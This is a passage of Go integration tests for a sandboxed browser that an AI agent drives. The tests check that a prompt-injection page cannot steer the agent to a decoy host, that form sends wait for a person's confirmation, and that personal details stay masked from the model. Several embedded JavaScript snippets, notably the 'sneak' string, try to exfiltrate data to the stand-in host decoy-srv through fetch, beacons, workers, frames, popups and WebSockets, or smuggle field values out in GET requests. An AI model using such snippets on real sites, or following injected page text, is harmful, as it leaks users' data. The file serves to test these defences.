package reed_test

import (
	"bytes"
	"encoding/json"
	"fmt"
	"image"
	"image/color"
	"image/jpeg"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"
	"unicode"

	"github.com/heedle-ai/reed"
)

// courseSites starts the course (forms-srv) and a decoy host (decoy-srv)
// on a fresh Podman network, and returns the network, what the course
// says each form received, and how many requests the decoy got.
func courseSites(t *testing.T) (network string, check func(form string) courseCheck, hits func() int) {
	t.Helper()
	if _, err := exec.LookPath("podman"); err != nil {
		t.Skip("no podman")
	}
	dir := t.TempDir()
	buildCourseServer(t, dir)
	if out, err := exec.Command("cp", "-r", "testdata/forms", filepath.Join(dir, "forms")).CombinedOutput(); err != nil {
		t.Fatalf("%v %s", err, out)
	}
	os.WriteFile(filepath.Join(dir, "Containerfile"), []byte("FROM scratch\nCOPY server /server\nCOPY forms /forms\nENTRYPOINT [\"/server\"]\n"), 0o644)
	img := podman(t, "build", "--quiet", dir)
	network = fmt.Sprintf("reed-course-%d", time.Now().UnixNano())
	podman(t, "network", "create", network)
	t.Cleanup(func() {
		exec.Command("podman", "rm", "-f", "-t", "0", network+"-forms", network+"-decoy").Run()
		exec.Command("podman", "network", "rm", "-f", network).Run()
	})
	podman(t, "run", "-d", "--rm", "--name", network+"-forms", "--network", network, "--network-alias", "forms-srv", "--network-alias", "other-srv",
		"-e", "COURSE_TOKEN=t0ken", "--publish", "127.0.0.1::8080", img, "course", "/forms")
	podman(t, "run", "-d", "--rm", "--name", network+"-decoy", "--network", network, "--network-alias", "decoy-srv", "--publish", "127.0.0.1::8080", img, "decoy")
	client := &http.Client{Transport: &http.Transport{Proxy: nil}}
	get := func(name, path string) []byte {
		addr := strings.Split(podman(t, "port", name, "8080/tcp"), "\n")[0]
		for i := 0; i < 100; i++ {
			if res, err := client.Get("http://" + addr + path); err == nil {
				b, _ := io.ReadAll(res.Body)
				res.Body.Close()
				return b
			}
			time.Sleep(100 * time.Millisecond)
		}
		t.Fatalf("%s unreachable", name)
		return nil
	}
	check = func(form string) courseCheck {
		var c courseCheck
		json.Unmarshal(get(network+"-forms", "/check/"+form+"?token=t0ken"), &c)
		return c
	}
	hits = func() int {
		var n int
		fmt.Sscan(string(get(network+"-decoy", "/hits")), &n)
		return n
	}
	check("contact")
	hits()
	return network, check, hits
}

// TestContainer_CourseInjectionReachesNothing: the course's injection
// form, filled and sent in an act session as Claude would (by hand here),
// reaches its own server, while the decoy host its page asks for (text
// addressed to the model, an image and a script's request) and Playwright
// navigating there by name receive nothing. (Roadmap 9.6.)
func TestContainer_CourseInjectionReachesNothing(t *testing.T) {
	img := testActBrowser(t)
	network, check, hits := courseSites(t)
	s, err := reed.Browser{Image: img, Network: network}.Start(ctx, reed.Visit{URL: "http://forms-srv:8080/injection/"})
	if err != nil {
		t.Fatal(err)
	}
	defer s.Close()
	cs := mcpSession(t, s)
	call(t, cs, "browser_navigate", map[string]any{"url": "http://forms-srv:8080/injection/"})
	snap, _ := call(t, cs, "browser_snapshot", nil)
	if !strings.Contains(snap, "decoy-srv") {
		t.Fatalf("the page doesn't try to steer:\n%s", snap)
	}
	if text, isErr := call(t, cs, "browser_fill_form", map[string]any{"fields": []map[string]any{
		{"name": "Feedback", "type": "textbox", "target": ref(t, snap, `textbox "Feedback"`), "value": "Great workshop, thank you."},
		{"name": "Rating", "type": "textbox", "target": ref(t, snap, `spinbutton "Rating (1 to 5)"`), "value": "5"},
	}}); isErr {
		t.Fatal(text)
	}
	call(t, cs, "browser_run_code_unsafe", map[string]any{"code": reed.ReleaseJS}) // a person confirmed (roadmap 9.7)
	call(t, cs, "browser_click", map[string]any{"element": "Send feedback", "target": ref(t, snap, `button "Send feedback"`)})
	if text, isErr := call(t, cs, "browser_navigate", map[string]any{"url": "http://decoy-srv:8080/collect"}); !isErr {
		t.Errorf("navigating to the decoy worked:\n%s", text)
	}
	time.Sleep(time.Second)
	if c := check("injection"); !c.Done {
		t.Errorf("the form's server got %v", c.Received)
	}
	if n := hits(); n != 0 {
		t.Fatalf("the decoy received %d requests", n)
	}
	// The control (review 40): allowed, the decoy is reached, so a zero
	// above means blocked, not unreachable.
	d, err := reed.Browser{Image: img, Network: network}.Start(ctx, reed.Visit{URL: "http://decoy-srv:8080/control"})
	if err != nil {
		t.Fatal(err)
	}
	defer d.Close()
	call(t, mcpSession(t, d), "browser_navigate", map[string]any{"url": "http://decoy-srv:8080/control"})
	if n := hits(); n == 0 {
		t.Fatal("the decoy can't be reached even when allowed: the test proves nothing")
	}
}

// TestContainer_ActHoldsFormsUntilConfirmed: in an act session the
// browser sends no form until a confirmation opens the way (ReleaseJS):
// submitting the course's contact form reaches nothing and is counted as
// held; once released, the same submission arrives; after that page
// loads, the hold is back. Lifted for the session (SendWithoutAsking),
// nothing is held. (Roadmap 9.7: nothing can submit the final form
// without a confirmation.)
func TestContainer_ActHoldsFormsUntilConfirmed(t *testing.T) {
	img := testActBrowser(t)
	network, check, hits := courseSites(t)
	s, err := reed.Browser{Image: img, Network: network}.Start(ctx, reed.Visit{URL: "http://forms-srv:8080/contact/"})
	if err != nil {
		t.Fatal(err)
	}
	defer s.Close()
	cs := mcpSession(t, s)
	run := func(code string) string {
		t.Helper()
		out, isErr := call(t, cs, "browser_run_code_unsafe", map[string]any{"code": code})
		if isErr {
			t.Fatalf("%s: %s", code, out)
		}
		return out
	}
	// send fills the contact form and clicks Send; between the two, a
	// person may confirm (ReleaseJS just before the click, as pirn runs
	// it), and the way closes after it (CloseJS).
	send := func(release bool) {
		t.Helper()
		call(t, cs, "browser_navigate", map[string]any{"url": "http://forms-srv:8080/contact/"})
		snap, _ := call(t, cs, "browser_snapshot", nil)
		call(t, cs, "browser_fill_form", map[string]any{"fields": []map[string]any{
			{"name": "Full name", "type": "textbox", "target": ref(t, snap, `textbox "Full name"`), "value": "Ada Lovelace"},
			{"name": "Email", "type": "textbox", "target": ref(t, snap, `textbox "Email"`), "value": "ada@example.org"},
			{"name": "Phone", "type": "textbox", "target": ref(t, snap, `textbox "Phone"`), "value": "020 7946 0018"},
			{"name": "Message", "type": "textbox", "target": ref(t, snap, `textbox "Message"`), "value": "Please call me back."},
		}})
		if release {
			run(reed.ReleaseJS)
		}
		call(t, cs, "browser_click", map[string]any{"element": "Send", "target": ref(t, snap, `button "Send"`)})
		if release {
			run(reed.CloseJS)
		}
	}
	send(false)
	if c := check("contact"); len(c.Received) != 0 {
		t.Fatalf("sent without a confirmation: %v", c.Received)
	}
	if held := run(reed.HeldJS); !strings.Contains(held, `"total":1`) || !strings.Contains(held, "POST http://forms-srv:8080/contact/submit") {
		t.Errorf("held: %s", held)
	}
	send(true)
	if c := check("contact"); !c.Done || len(c.Received) != 1 {
		t.Fatalf("not sent once released: %v", c.Received)
	}
	send(false) // closed after the click: held again
	if c := check("contact"); len(c.Received) != 1 {
		t.Fatalf("sent twice on one confirmation: %v", c.Received)
	}
	// Review 41: a confirmation doesn't carry over to another page: the
	// main frame loading one closes the way.
	run(reed.ReleaseJS)
	send(false)
	if c := check("contact"); len(c.Received) != 1 {
		t.Fatalf("a confirmation carried over to another page: %v", c.Received)
	}

	// Review 41: every other way a page sends is held too: fetch, a
	// beacon, a worker, a form in a frame or a popup, and a WebSocket's
	// messages. A session that may reach the decoy shows it: the decoy
	// counts every request it gets.
	other, err := reed.Browser{Image: img, Network: network}.Start(ctx, reed.Visit{URL: "http://forms-srv:8080/contact/", Allow: []string{"decoy-srv"}})
	if err != nil {
		t.Fatal(err)
	}
	defer other.Close()
	cs = mcpSession(t, other)
	call(t, cs, "browser_navigate", map[string]any{"url": "http://forms-srv:8080/contact/"})
	before := hits()
	sneak := `async (page) => { await page.evaluate(async () => {
  const d = "http://decoy-srv:8080";
  fetch(d + "/fetch", { method: "POST", body: "a=1", mode: "no-cors" }).catch(() => {});
  navigator.sendBeacon(d + "/beacon", "a=1");
  new Worker(URL.createObjectURL(new Blob(["fetch('" + d + "/worker', { method: 'POST', body: 'a=1', mode: 'no-cors' }).catch(() => {})"])));
  const f = document.createElement("iframe");
  f.srcdoc = "<form method=post action=" + d + "/frame><input name=a value=1></form><script>document.forms[0].submit()</script>";
  document.body.append(f);
  const w = window.open("");
  if (w) { w.document.write("<form method=post action=" + d + "/popup><input name=a value=1></form>"); w.document.forms[0].submit(); }
  const ws = new WebSocket("ws://decoy-srv:8080/ws");
  ws.onopen = () => ws.send("a=1");
  await new Promise((r) => setTimeout(r, 3000));
}); return "done"; }`
	run(sneak)
	if n := hits() - before; n != 0 {
		t.Errorf("the decoy got %d requests while the hold was on", n)
	}
	if held := run(reed.HeldJS); !strings.Contains(held, "/fetch") || !strings.Contains(held, "/beacon") || !strings.Contains(held, "/worker") || !strings.Contains(held, "/frame") {
		t.Errorf("held: %s", held)
	}
	// The control: released, a fetch reaches the decoy, so a zero above
	// means held, not unreachable.
	run(reed.ReleaseJS)
	run(`async (page) => { await page.evaluate(() => fetch("http://decoy-srv:8080/control", { method: "POST", body: "a=1", mode: "no-cors" })); return "done"; }`)
	run(reed.CloseJS)
	if hits() == before {
		t.Error("the decoy can't be reached even when released: the test proves nothing")
	}

	free, err := reed.Browser{Image: img, Network: network}.Start(ctx, reed.Visit{URL: "http://forms-srv:8080/contact/"})
	if err != nil {
		t.Fatal(err)
	}
	defer free.Close()
	if err := free.SendWithoutAsking(ctx); err != nil {
		t.Fatal(err)
	}
	cs = mcpSession(t, free)
	send(false)
	if c := check("contact"); len(c.Received) != 2 {
		t.Fatalf("held although lifted for the session: %v", c.Received)
	}
}

// TestContainer_ActUsesProfileWithoutShowingIt: a session given the
// person's details (UseProfile, roadmap 9.8) types each value where the
// model types its placeholder, so the form receives the real value; what
// Playwright MCP answers shows the placeholder, never the value; and a
// frame (ShotJS) masks every field holding one, and only those.
func TestContainer_ActUsesProfileWithoutShowingIt(t *testing.T) {
	img := testActBrowser(t)
	network, check, _ := courseSites(t)
	s, err := reed.Browser{Image: img, Network: network}.Start(ctx, reed.Visit{URL: "http://forms-srv:8080/contact/"})
	if err != nil {
		t.Fatal(err)
	}
	defer s.Close()
	profile := map[string]string{"⟨name⟩": "Ada Lovelace", "⟨email⟩": "ada@example.org"}
	if err := s.UseProfile(ctx, profile); err != nil {
		t.Fatal(err)
	}
	cs := mcpSession(t, s)
	var seen strings.Builder
	do := func(tool string, args map[string]any) string {
		t.Helper()
		out, isErr := call(t, cs, tool, args)
		if isErr {
			t.Fatalf("%s: %s", tool, out)
		}
		seen.WriteString(out)
		return out
	}
	before := len(check("contact").Received)
	do("browser_navigate", map[string]any{"url": "http://forms-srv:8080/contact/"})
	snap := do("browser_snapshot", nil)
	do("browser_fill_form", map[string]any{"fields": []map[string]any{
		{"name": "Full name", "type": "textbox", "target": ref(t, snap, `textbox "Full name"`), "value": "⟨name⟩"},
		{"name": "Email", "type": "textbox", "target": ref(t, snap, `textbox "Email"`), "value": "⟨email⟩"},
		{"name": "Phone", "type": "textbox", "target": ref(t, snap, `textbox "Phone"`), "value": "020 7946 0018"},
		{"name": "Message", "type": "textbox", "target": ref(t, snap, `textbox "Message"`), "value": "Please call me back."},
	}})
	after := do("browser_snapshot", nil)
	for _, v := range profile {
		if strings.Contains(seen.String(), v) {
			t.Errorf("Playwright MCP showed %q:\n%s", v, after)
		}
	}
	if !strings.Contains(after, "⟨name⟩") || !strings.Contains(after, "020 7946 0018") {
		t.Errorf("the filled form, as the model sees it:\n%s", after)
	}
	// The frame: the name and email fields masked, the phone not.
	// Review 42: a frame isn't taken unless the browser has every detail
	// to mask.
	if out, isErr := call(t, cs, "browser_run_code_unsafe", map[string]any{"code": reed.ShotJSFor(3)}); !isErr {
		t.Errorf("a frame with a detail missing from the mask: %.200s", out)
	}
	// The page replaces its String and RegExp methods: masking passes it
	// none of the details (review 52).
	do("browser_run_code_unsafe", map[string]any{"code": spyJS})
	// The page plants candidates for a detail, hidden, and watches every
	// attribute: masking tells it nothing (review 52, round 4).
	do("browser_run_code_unsafe", map[string]any{"code": `async (page) => page.evaluate(() => {
  const box = document.createElement("div"); box.style.display = "none";
  for (const c of ["Ada Byron", "Ada Lovelace", "Grace Hopper"]) { const s = document.createElement("span"); s.className = "candidate"; s.textContent = c; box.append(s); }
  document.body.append(box);
  window.__mutated = [];
  new MutationObserver((ms) => { for (const m of ms) if (m.attributeName !== "style" || m.target.className === "candidate") window.__mutated.push(m.attributeName); }).observe(document, { attributes: true, subtree: true });
  return "watching";
})`})
	shot := do("browser_run_code_unsafe", map[string]any{"code": reed.ShotJSFor(2)})
	unseen(t, result(t, do("browser_run_code_unsafe", map[string]any{"code": spiedJS})), "Ada Lovelace", "ada@example.org")
	// (Playwright's screenshot sets styles of its own, the same whatever
	// matches.)
	if m := do("browser_run_code_unsafe", map[string]any{"code": `async (page) => JSON.stringify(await page.evaluate(() => [...window.__mutated, ...[...document.querySelectorAll(".candidate")].flatMap((e) => [...e.attributes].map((a) => a.name)).filter((n) => n !== "class")]))`}); result(t, m) != "[]" {
		t.Errorf("masking changed the page's attributes: %s", result(t, m))
	}
	pic, err := shotOf(shot)
	if err != nil {
		t.Fatal(err)
	}
	boxes := do("browser_run_code_unsafe", map[string]any{"code": `async (page) => JSON.stringify(await Promise.all(["Full name", "Email", "Phone"].map((l) => page.getByLabel(l).boundingBox())))`})
	var rects []struct{ X, Y, Width, Height float64 }
	if json.Unmarshal([]byte(result(t, boxes)), &rects) != nil || len(rects) != 3 {
		t.Fatalf("boxes: %s", boxes)
	}
	masked := func(r struct{ X, Y, Width, Height float64 }) float64 { // of pic
		in, all := 0, 0
		for y := int(r.Y) + 2; y < int(r.Y+r.Height)-2; y++ {
			for x := int(r.X) + 2; x < int(r.X+r.Width)-2; x++ {
				c := color.RGBAModel.Convert(pic.At(x, y)).(color.RGBA)
				all++
				if near(c.R, 0x5b) && near(c.G, 0x5f) && near(c.B, 0x6b) {
					in++
				}
			}
		}
		return float64(in) / float64(max(all, 1))
	}
	if n, e, p := masked(rects[0]), masked(rects[1]), masked(rects[2]); n < 0.9 || e < 0.9 || p > 0.2 {
		t.Errorf("masked: name %.2f, email %.2f, phone %.2f", n, e, p)
	}
	// Review 42: a page reading a filled field and sending it on with a
	// GET, encoded, is held like a send.
	do("browser_run_code_unsafe", map[string]any{"code": `async (page) => { await page.evaluate(() => {
  const e = document.querySelector("input[name=email]").value, n = document.querySelector("input[name=name]").value;
  new Image().src = "/contact/?e=" + encodeURIComponent(e);
  fetch("/contact/?n=" + n.replace(/ /g, "+")).catch(() => {});
}); await new Promise((r) => setTimeout(r, 1500)); return "done"; }`})
	if held := do("browser_run_code_unsafe", map[string]any{"code": reed.HeldJS}); !strings.Contains(held, "GET http://forms-srv:8080/contact/?e=") || !strings.Contains(held, "GET http://forms-srv:8080/contact/?n=") {
		t.Errorf("a GET carrying a detail wasn't held: %s", held)
	}
	// Review 42: the files holding the details can't be opened in the browser.
	if out, _ := call(t, cs, "browser_navigate", map[string]any{"url": "file://" + reed.ActProfile}); strings.Contains(out, "ada@") || strings.Contains(out, "Ada Lovelace") {
		t.Errorf("file: opened: %s", out)
	}
	// What arrives is the real value.
	do("browser_navigate", map[string]any{"url": "http://forms-srv:8080/contact/"})
	snap = do("browser_snapshot", nil)
	do("browser_fill_form", map[string]any{"fields": []map[string]any{
		{"name": "Full name", "type": "textbox", "target": ref(t, snap, `textbox "Full name"`), "value": "⟨name⟩"},
		{"name": "Email", "type": "textbox", "target": ref(t, snap, `textbox "Email"`), "value": "⟨email⟩"},
		{"name": "Phone", "type": "textbox", "target": ref(t, snap, `textbox "Phone"`), "value": "020 7946 0018"},
		{"name": "Message", "type": "textbox", "target": ref(t, snap, `textbox "Message"`), "value": "Please call me back."},
	}})
	snap = do("browser_snapshot", nil)
	do("browser_run_code_unsafe", map[string]any{"code": reed.ReleaseJS})
	do("browser_click", map[string]any{"element": "Send", "target": ref(t, snap, `button "Send"`)})
	do("browser_run_code_unsafe", map[string]any{"code": reed.CloseJS})
	got := check("contact").Received
	if len(got) != before+1 || !strings.Contains(got[len(got)-1], "name=Ada+Lovelace") || !strings.Contains(got[len(got)-1], "email=ada%40example.org") {
		t.Errorf("received %v", got)
	}
	// Review 42: a value the page reformats, uppercases or spells out, in
	// a frame or a shadow root, is masked too; other text isn't.
	do("browser_run_code_unsafe", map[string]any{"code": `async (page) => { await page.setContent(` + "`" + `
<style>input, div { display:block; width:300px; height:30px; margin:8px; font:16px sans-serif; } iframe { width:340px; height:60px; border:0; }</style>
<input id=upper value="ADA LOVELACE">
<input id=other value="Grace Hopper">
<div id=spelled>A d a  L o v e l a c e</div>
<iframe srcdoc="<input style='width:300px;height:30px' value='ADA@example.org'>"></iframe>
<div id=host></div>` + "`" + `);
  await page.evaluate(() => { const s = document.getElementById("host").attachShadow({ mode: "open" }); s.innerHTML = '<input style="width:300px;height:30px" value="ada@example.org">'; });
  await page.waitForTimeout(500); return "set"; }`})
	shot = do("browser_run_code_unsafe", map[string]any{"code": reed.ShotJSFor(2)})
	if pic, err = shotOf(shot); err != nil {
		t.Fatal(err)
	}
	boxes = do("browser_run_code_unsafe", map[string]any{"code": `async (page) => JSON.stringify(await Promise.all([
  page.locator("#upper").boundingBox(), page.locator("#spelled").boundingBox(), page.frameLocator("iframe").locator("input").boundingBox(),
  page.locator("#host input").boundingBox(), page.locator("#other").boundingBox()]))`})
	rects = nil
	if json.Unmarshal([]byte(result(t, boxes)), &rects) != nil || len(rects) != 5 {
		t.Fatalf("boxes: %s", boxes)
	}
	for i, name := range []string{"uppercased", "spelled out", "in a frame", "in a shadow root"} {
		if m := masked(rects[i]); m < 0.9 {
			t.Errorf("%s: masked %.2f", name, m)
		}
	}
	if m := masked(rects[4]); m > 0.2 {
		t.Errorf("other text masked %.2f", m)
	}
	// A frame whose document changes every 40 ms: every frame taken has
	// the detail masked (none may be taken).
	do("browser_run_code_unsafe", map[string]any{"code": `async (page) => { await page.setContent('<iframe id=flicker style="width:400px;height:80px;border:0"></iframe>'); await page.evaluate(() => { const f = document.getElementById("flicker"); let n = 0; setInterval(() => { f.srcdoc = '<p style="font:28px sans-serif;margin:0">Ada Lovelace ' + (n++) + '</p>'; }, 40); }); await page.waitForTimeout(300); return "flickering"; }`})
	fast := do("browser_run_code_unsafe", map[string]any{"code": `async (page) => JSON.stringify(await page.locator("#flicker").boundingBox())`})
	var ff struct{ X, Y, Width, Height float64 }
	json.Unmarshal([]byte(result(t, fast)), &ff)
	for range 6 {
		out, isErr := call(t, cs, "browser_run_code_unsafe", map[string]any{"code": reed.ShotJSFor(2)})
		if isErr {
			continue
		}
		if pic, err = shotOf(out); err != nil {
			t.Fatal(err)
		}
		if m := masked(struct{ X, Y, Width, Height float64 }{ff.X + 10, ff.Y + 10, 140, 22}); m < 0.9 {
			t.Errorf("a fast-changing frame's detail masked %.2f", m)
		}
	}
	// A frame whose document changes every 1.5 seconds, showing a detail
	// each time:
	// there is no frame, or the detail is masked; never an unmasked one
	// (review 52, round 4: a document loaded between marking and the
	// screenshot wasn't masked).
	do("browser_run_code_unsafe", map[string]any{"code": `async (page) => { await page.setContent('<iframe id=flicker style="width:400px;height:80px;border:0"></iframe>'); await page.evaluate(() => { const f = document.getElementById("flicker"); let n = 0; const show = () => { f.srcdoc = '<p style="font:28px sans-serif;margin:0">Ada Lovelace ' + (n++) + '</p>'; }; show(); setInterval(show, 1500); }); await page.waitForTimeout(500); return "changing"; }`})
	box := do("browser_run_code_unsafe", map[string]any{"code": `async (page) => JSON.stringify(await page.locator("#flicker").boundingBox())`})
	var fr struct{ X, Y, Width, Height float64 }
	json.Unmarshal([]byte(result(t, box)), &fr)
	taken := 0
	for range 6 {
		out, isErr := call(t, cs, "browser_run_code_unsafe", map[string]any{"code": reed.ShotJSFor(2)})
		if isErr {
			continue
		}
		if pic, err = shotOf(out); err != nil {
			t.Fatal(err)
		}
		taken++
		if m := masked(struct{ X, Y, Width, Height float64 }{fr.X + 10, fr.Y + 10, 140, 22}); m < 0.9 {
			t.Errorf("a changing frame's detail masked %.2f", m)
		}
	}
	if t.Logf("of 6 shots of a changing frame, %d taken", taken); taken == 0 {
		t.Error("no shot of a frame changing every 1.5 seconds was taken: masking wasn't checked")
	}
}

func near(a, b uint8) bool { return a >= b-12 && a <= b+12 }

// result is the string a browser_run_code_unsafe call returned.
func result(t *testing.T, out string) string {
	t.Helper()
	var s string
	if i := strings.Index(out, "\""); i < 0 || json.NewDecoder(strings.NewReader(out[i:])).Decode(&s) != nil {
		t.Fatalf("not a string result: %.300s", out)
	}
	return s
}

// TestContainer_ActPersonDrives: a person can take the wheel of an act
// session (roadmap 9.10). Their clicks and keys reach the page as input
// events (ClickJS, KeyJS); while they drive (PersonJS) what they send goes
// through, counted as sent by them (PersonDoneJS); once they hand back, the
// hold is on again. Every frame masks the password field and each field
// they typed into, and only those.
func TestContainer_ActPersonDrives(t *testing.T) {
	img := testActBrowser(t)
	network, check, _ := courseSites(t)
	s, err := reed.Browser{Image: img, Network: network}.Start(ctx, reed.Visit{URL: "http://forms-srv:8080/password/"})
	if err != nil {
		t.Fatal(err)
	}
	defer s.Close()
	cs := mcpSession(t, s)
	run := func(code string, err error) string {
		t.Helper()
		if err != nil {
			t.Fatal(err)
		}
		out, isErr := call(t, cs, "browser_run_code_unsafe", map[string]any{"code": code})
		if isErr {
			t.Fatalf("%.200s: %s", code, out)
		}
		return out
	}
	call(t, cs, "browser_navigate", map[string]any{"url": "http://forms-srv:8080/password/"})
	boxes := run(`async (page) => JSON.stringify(await Promise.all(["Email", "Password", "New delivery address"].map((l) => page.getByLabel(l).boundingBox())))`, nil)
	var rects []struct{ X, Y, Width, Height float64 }
	if json.Unmarshal([]byte(result(t, boxes)), &rects) != nil || len(rects) != 3 {
		t.Fatalf("boxes: %s", boxes)
	}
	run(reed.PersonJS, nil)
	run(reed.ClickJS(int(rects[0].X+5), int(rects[0].Y+5)))
	// A typo fixed with an arrow key: what was typed is the field's value,
	// whatever the runs (review 52).
	for _, k := range append(strings.Split("ada@example.og", ""), "ArrowLeft", "r") {
		run(reed.KeyJS(k))
	}
	if out := run(reed.KeyJS("End")); !strings.Contains(out, `ada@example.org`) {
		t.Errorf("the field's value: %s", out)
	}
	run(reed.KeyJS("Tab"))
	for _, k := range strings.Split("hunter2", "") {
		run(reed.KeyJS(k))
	}
	if typed := run(reed.TypedJS, nil); !strings.Contains(typed, `"ada@example.org"`) || !strings.Contains(typed, `"hunter2"`) {
		t.Errorf("typed: %s", typed)
	}
	// The frame: the field typed into and the password field masked, the
	// one left alone not.
	pic, err := shotOf(run(reed.ShotJSFor(0), nil))
	if err != nil {
		t.Fatal(err)
	}
	masked := func(r struct{ X, Y, Width, Height float64 }) float64 {
		in, all := 0, 0
		for y := int(r.Y) + 2; y < int(r.Y+r.Height)-2; y++ {
			for x := int(r.X) + 2; x < int(r.X+r.Width)-2; x++ {
				c := color.RGBAModel.Convert(pic.At(x, y)).(color.RGBA)
				all++
				if near(c.R, 0x5b) && near(c.G, 0x5f) && near(c.B, 0x6b) {
					in++
				}
			}
		}
		return float64(in) / float64(max(all, 1))
	}
	if e, p, a := masked(rects[0]), masked(rects[1]), masked(rects[2]); e < 0.9 || p < 0.9 || a > 0.2 {
		t.Errorf("masked: typed %.2f, password %.2f, untouched %.2f", e, p, a)
	}
	run(reed.KeyJS("Enter")) // the person sends it: theirs
	time.Sleep(time.Second)
	if got := check("password").Received; len(got) != 1 || !strings.Contains(got[0], "email=ada%40example.org") {
		t.Errorf("sent by the person: received %v", got)
	}
	heldTotal := func() int {
		var h struct{ Total int }
		out := run(reed.HeldJS, nil)
		if i := strings.IndexByte(out, '{'); i < 0 || json.NewDecoder(strings.NewReader(out[i:])).Decode(&h) != nil {
			t.Fatalf("held: %s", out)
		}
		return h.Total
	}
	held := heldTotal()
	// A WebSocket the page opens just after the person's click connects,
	// and what it sends then is theirs; once PersonWindow has passed, the
	// page's own sends on it, and its own fetches, are held, still during
	// the pause (review 52: the way was open for the whole pause, and a
	// WebSocket stayed open after it).
	run(reed.ClickJS(5, 5))
	if out := run(`async (page) => page.evaluate(() => new Promise((r) => { const w = new WebSocket("ws://forms-srv:8080/ws/password"); window.__w = w; w.onopen = () => { w.send("one"); r("open"); }; w.onerror = () => r("error"); }))`, nil); !strings.Contains(out, "open") {
		t.Fatalf("websocket: %s", out)
	}
	time.Sleep(reed.PersonWindow + time.Second)
	run(`async (page) => page.evaluate(() => { window.__w.send("two"); return fetch("/password/submit", { method: "POST", body: new URLSearchParams({ email: "page@example.org" }) }).then(() => "sent", () => "held"); })`, nil)
	time.Sleep(time.Second)
	got := check("password").Received
	if strings.Join(got, " ") != "address=&email=ada%40example.org&password=hunter2 ws=one" {
		t.Errorf("received during the pause: %v", got)
	}
	if n := heldTotal(); n != held+2 {
		t.Errorf("held during the pause: %d, then %d", held, n)
	}
	// The person's hand-back fails (a dialog left open, say): the hold is
	// on anyway, as their last input was more than PersonWindow ago.
	call(t, cs, "browser_navigate", map[string]any{"url": "http://forms-srv:8080/password/"})
	snap, _ := call(t, cs, "browser_snapshot", nil)
	call(t, cs, "browser_type", map[string]any{"element": "Email", "target": ref(t, snap, `textbox "Email"`), "text": "claude@example.org"})
	held = heldTotal()
	call(t, cs, "browser_click", map[string]any{"element": "Sign in", "target": ref(t, snap, `button "Sign in and save"`)})
	time.Sleep(time.Second)
	if got := check("password").Received; len(got) != 2 || heldTotal() != held+1 {
		t.Errorf("Claude's send with the person's hand-back failed: received %v, held %d then %d", got, held, heldTotal())
	}
	done := run(reed.PersonDoneJS, nil)
	if strings.Count(done, "POST http://forms-srv:8080/password/submit") != 1 || !strings.Contains(done, "WS ws://forms-srv:8080/ws/password") || strings.Contains(done, "page@example.org") {
		t.Errorf("sent by you: %s", done)
	}
	// Handed back: the hold is on again.
	call(t, cs, "browser_navigate", map[string]any{"url": "http://forms-srv:8080/password/"})
	snap, _ = call(t, cs, "browser_snapshot", nil)
	call(t, cs, "browser_type", map[string]any{"element": "Email", "target": ref(t, snap, `textbox "Email"`), "text": "claude@example.org"})
	held = heldTotal()
	call(t, cs, "browser_click", map[string]any{"element": "Sign in", "target": ref(t, snap, `button "Sign in and save"`)})
	time.Sleep(time.Second)
	if got := check("password").Received; len(got) != 2 || heldTotal() != held+1 {
		t.Errorf("sent after the person handed back: %v, held %d then %d", got, held, heldTotal())
	}
	// A form in an iframe: the field inside it is marked and read, a typo
	// fixed there too, and only the field is masked, not the frame
	// (review 52, round 2); a character doesn't open the way, so what the
	// page sends on a keystroke is held; text echoing what was typed is
	// masked in frames.
	call(t, cs, "browser_navigate", map[string]any{"url": "http://forms-srv:8080/iframe/"})
	fboxes := run(`async (page) => { const f = page.frameLocator("iframe"); await f.getByLabel("Email").waitFor(); return JSON.stringify(await Promise.all([f.getByLabel("Email").boundingBox(), f.getByRole("button", { name: "Subscribe" }).boundingBox()])); }`, nil)
	var frects []struct{ X, Y, Width, Height float64 }
	if json.Unmarshal([]byte(result(t, fboxes)), &frects) != nil || len(frects) != 2 {
		t.Fatalf("frame boxes: %s", fboxes)
	}
	run(reed.PersonJS, nil)
	run(reed.ClickJS(int(frects[0].X+5), int(frects[0].Y+5)))
	time.Sleep(reed.PersonWindow + 500*time.Millisecond)
	held = heldTotal()
	for _, k := range append(strings.Split("ada@example.og", ""), "ArrowLeft", "r") {
		run(reed.KeyJS(k))
	}
	run(`async (page) => page.evaluate(() => fetch("/iframe/submit", { method: "POST", body: new URLSearchParams({ email: "key@example.org", frequency: "weekly" }) }).then(() => "sent", () => "held"))`, nil)
	if n := heldTotal(); n != held+1 || len(check("iframe").Received) != 0 {
		t.Errorf("a send while the person typed: held %d then %d, received %v", held, n, check("iframe").Received)
	}
	if out := run(reed.KeyJS("End")); !strings.Contains(out, `ada@example.org`) {
		t.Errorf("the framed field's value: %s", out)
	}
	if typed := run(reed.TypedJS, nil); !strings.Contains(typed, `"ada@example.org"`) {
		t.Errorf("typed in the frame: %s", typed)
	}
	run(`async (page) => page.evaluate(() => { const p = document.createElement("p"); p.style.font = "32px sans-serif"; p.textContent = "Signed in as ada@example.org"; document.body.prepend(p); return "shown"; })`, nil)
	echo := run(`async (page) => JSON.stringify(await page.getByText("Signed in as").boundingBox())`, nil)
	var erect struct{ X, Y, Width, Height float64 }
	json.Unmarshal([]byte(result(t, echo)), &erect)
	// The field moved down with the echo above it: measure again.
	fboxes = run(`async (page) => { const f = page.frameLocator("iframe"); return JSON.stringify(await Promise.all([f.getByLabel("Email").boundingBox(), f.getByRole("button", { name: "Subscribe" }).boundingBox()])); }`, nil)
	json.Unmarshal([]byte(result(t, fboxes)), &frects)
	// The page and its frame replace their String and RegExp methods:
	// masking passes them nothing typed (review 52, round 3).
	run(spyJS, nil)
	pic, err = shotOf(run(reed.ShotJSFor(0), nil))
	if err != nil {
		t.Fatal(err)
	}
	unseen(t, result(t, run(spiedJS, nil)), "ada@example.org")
	if f, b, e := masked(frects[0]), masked(frects[1]), masked(erect); f < 0.9 || b > 0.2 || e < 0.9 {
		t.Errorf("masked in the frame: typed %.2f, button %.2f; the echo %.2f", f, b, e)
	}
	run(reed.PersonDoneJS, nil)
	// Spaces typed in a field don't open the way, nor does Enter in a
	// textarea: a page sending on each key is held (review 52, round 3).
	call(t, cs, "browser_navigate", map[string]any{"url": "http://forms-srv:8080/password/"})
	run(`async (page) => { await page.evaluate(() => { const t = document.createElement("textarea"); t.id = "note"; document.body.append(t); }); return "added"; }`, nil)
	abox := run(`async (page) => JSON.stringify(await Promise.all([page.getByLabel("New delivery address").boundingBox(), page.locator("#note").boundingBox()]))`, nil)
	var arects []struct{ X, Y, Width, Height float64 }
